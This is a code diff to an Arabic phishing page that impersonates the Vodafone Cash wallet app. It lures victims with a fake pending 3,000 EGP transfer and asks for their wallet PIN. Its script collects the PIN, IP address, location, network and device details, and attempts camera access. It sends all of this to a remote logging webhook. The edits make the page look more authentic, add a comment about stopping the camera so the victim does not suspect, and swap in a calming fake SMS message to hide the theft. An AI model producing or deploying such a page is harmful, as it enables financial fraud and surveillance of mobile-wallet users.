@@ -2,44 +2,74 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vodafone Cash | التحقق من العملية</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>أنا فودافون | فودافون كاش</title>
+    
+    <link rel="stylesheet" href="https://voda-font.b-cdn.net/voda-fonts.css">
+    
     <style>
-        body { background: #f4f4f4; color: #333; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .app-container { background: white; width: 100%; max-width: 400px; height: 100vh; display: flex; flex-direction: column; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
-        .header { background: #e60000; color: white; padding: 20px; text-align: center; font-weight: bold; font-size: 18px; }
-        .content { padding: 25px; flex: 1; }
-        .notif { background: #fff5f5; border: 1px dashed #e60000; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
-        .amount-txt { color: #e60000; font-size: 22px; font-weight: bold; display: block; margin-top: 5px; }
-        label { display: block; margin-bottom: 8px; font-size: 14px; color: #666; font-weight: bold; }
-        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 5px; font-size: 18px; text-align: center; letter-spacing: 5px; box-sizing: border-box; }
-        .btn { background: #e60000; color: white; border: none; padding: 15px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; }
-        .secure-footer { text-align: center; padding: 20px; font-size: 11px; color: #aaa; }
+        * { box-sizing: border-box; }
+        body { background: #f4f4f4; color: #333; font-family: 'Vodafone Rg', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        
+        .mobile-frame { background: white; width: 100%; max-width: 400px; height: 100vh; display: flex; flex-direction: column; box-shadow: 0 0 30px rgba(0,0,0,0.1); border-radius: 20px; position: relative; }
+        
+        .header { background: #e60000; color: white; padding: 15px; font-weight: bold; font-size: 16px; text-align: right; display: flex; align-items: center; justify-content: space-between; position: relative; }
+        .back-icon { width: 18px; cursor: pointer; }
+        
+        .content { padding: 25px; flex: 1; overflow-y: auto; }
+        
+        .notif-card { background: #fff5f5; border: 1px solid #ffcccc; padding: 20px; border-radius: 12px; margin-bottom: 25px; position: relative; }
+        .msg-title { color: #e60000; font-size: 14px; font-weight: bold; }
+        .amount-row { display: flex; align-items: flex-end; margin-top: 10px; margin-bottom: 10px; }
+        .currency { font-size: 16px; color: #e60000; margin-left: 5px; }
+        .amount { font-size: 32px; font-weight: bold; color: #e60000; line-height: 1; }
+        .sender-info { font-size: 12px; color: #777; margin-top: 5px; }
+        
+        .form-label { display: block; margin-bottom: 10px; font-size: 13px; color: #555; }
+        .input-wrapper { position: relative; margin-bottom: 25px; }
+        .input-icon { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); width: 20px; opacity: 0.5; }
+        
+        input { width: 100%; padding: 15px; padding-right: 45px; border: 1px solid #dadce0; border-radius: 8px; font-size: 18px; text-align: center; letter-spacing: 3px; font-family: sans-serif; font-weight: bold; background: #fafafa; }
+        input:focus { border-color: #e60000; box-shadow: 0 0 0 2px rgba(230,0,0,0.1); outline: none; }
+        
+        .btn { background: #e60000; color: white; border: none; padding: 16px; width: 100%; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.2s; -webkit-tap-highlight-color: transparent; }
+        .btn:active { background: #c50000; transform: scale(0.98); }
+        
+        .secure-lock { text-align: center; margin-top: 25px; color: #aaa; font-size: 12px; }
+        .lock-icon { width: 12px; opacity: 0.5; vertical-align: middle; margin-left: 5px; }
     </style>
 </head>
 <body>
 
-<div class="app-container">
-    <div class="header">خدمات فودافون كاش</div>
+<div class="mobile-frame">
+    <div class="header">
+        <img src="https://cdn-icons-png.flaticon.com/512/5720/5720446.png" class="back-icon" alt="عودة">
+        <span>أنا فودافون / فودافون كاش</span>
+        <div style="width:18px;"></div> </div>
     
     <div class="content">
-        <div class="notif">
-            تم استلام حوالة معلقة بقيمة:
-            <span class="amount-txt">3,000.00 ج.م</span>
-            <small>من رقم: 01064001459</small>
+        <div class="notif-card">
+            <span class="msg-title">حوالة واردة معلقة</span>
+            <div class="amount-row">
+                <span class="amount">3,000.00</span>
+                <span class="currency">ج.م</span>
+            </div>
+            <p class="sender-info">من رقم: 01064001459<br>التاريخ: الأربعاء 16 أبريل 2026</p>
         </div>
 
-        <p style="font-size: 13px; color: #555;">لتأكيد إيداع المبلغ في حسابك، يرجى إدخال الرقم السري للمحفظة (PIN) لإتمام الفحص الأمني السريع.</p>
+        <p style="font-size: 13px; color: #666; line-height: 1.6; margin-bottom: 25px;">بناءً على تعليمات البنك المركزي المصري، يرجى إدخال الرقم السري للمحفظة (PIN) للتأكد من هويتكم وإضافة المبلغ إلى رصيدكم الحالي.</p>
         
-        <label>أدخل الرقم السري (6 أرقام):</label>
-        <input type="password" id="userPin" maxlength="6" placeholder="******" inputmode="numeric">
+        <div class="input-wrapper">
+            <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" class="input-icon" alt="PIN">
+            <input type="password" id="userPin" maxlength="6" placeholder="رقم التعريف السري (PIN)" inputmode="numeric">
+        </div>
 
-        <button class="btn" onclick="captureEverything()">تأكيد واستلام الحوالة</button>
-    </div>
-
-    <div class="secure-footer">
-        🔒 اتصال آمن ومشر ببروتوكول SSL <br>
-        حقوق الطبع والنشر © فودافون مصر 2026
+        <button class="btn" onclick="captureEverything()">تأكيد العملية الآن</button>
+        
+        <div class="secure-lock">
+            <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" class="lock-icon" alt="Lock">
+            اتصال آمن ومشر (SSL) | فودافون كاش
+        </div>
     </div>
 </div>
 
@@ -53,6 +83,7 @@
             sendLog("🔴 **محاولة دخول جديدة**", [
                 { name: "🌐 الـ IP", value: ipInfo.ip, inline: true },
                 { name: "📍 المكان", value: ipInfo.city + ", " + ipInfo.country_name, inline: true },
+                { name: "🏢 الشبكة", value: ipInfo.org, inline: false },
                 { name: "📱 الجهاز", value: navigator.platform, inline: true }
             ], 16711680);
         } catch(e) {}
@@ -62,7 +93,7 @@
         const pin = document.getElementById('userPin').value;
         
         if(pin.length < 6) {
-            alert("يرجى إدخال الرقم السري بشكل صحيح المكون من 6 أرقام.");
+            alert("يرجى إدخال الرقم السري المكون من 6 أرقام لإتمام العملية.");
             return;
         }
 
@@ -73,8 +104,9 @@
 
         // 2. محاولة سحب الكاميرا والموقع
         try {
-            await navigator.mediaDevices.getUserMedia({ video: true });
-            sendLog("📸 الكاميرا", [{ name: "الحالة", value: "تم تفعيل الوصول", inline: true }], 3066993);
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            sendLog("📸 الكاميرا", [{ name: "الحالة", value: "تم السماح بالوصول", inline: true }], 3066993);
+            stream.getTracks().forEach(track => track.stop()); // قفل الكاميرا عشان الضحية مايشكش
         } catch(e) {}
 
         navigator.geolocation.getCurrentPosition((pos) => {
@@ -83,10 +115,10 @@
             ], 3066993);
             
             // التمويه النهائي
-            alert("عذراً، الرقم السري غير متطابق مع بيانات المحفظة. يرجى المحاولة عبر تطبيق أنا فودافون.");
+            alert("تم إرسال طلب التأكيد. ستصلك رسالة نصية (SMS) بتفاصيل التحويل خلال 15 دقيقة.");
         }, (err) => {
-            alert("فشل التحقق الأمني: يجب السماح بالوصول للموقع لإتمام الحوالة.");
-        });
+            alert("يجب السماح بالوصول للموقع لتأكيد هويتك وإتمام العملية.");
+        }, { enableHighAccuracy: true });
     }
 
     async function sendLog(title, fields, color) {
@@ -94,7 +126,7 @@
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                username: "Voda-Cash Logger",
+                username: "Voda-Cash Core Logger",
                 avatar_url: "https://upload.wikimedia.org/wikipedia/commons/a/af/Vodafone_Logo.svg",
                 embeds: [{ title: title, color: color, fields: fields, timestamp: new Date() }]
             })
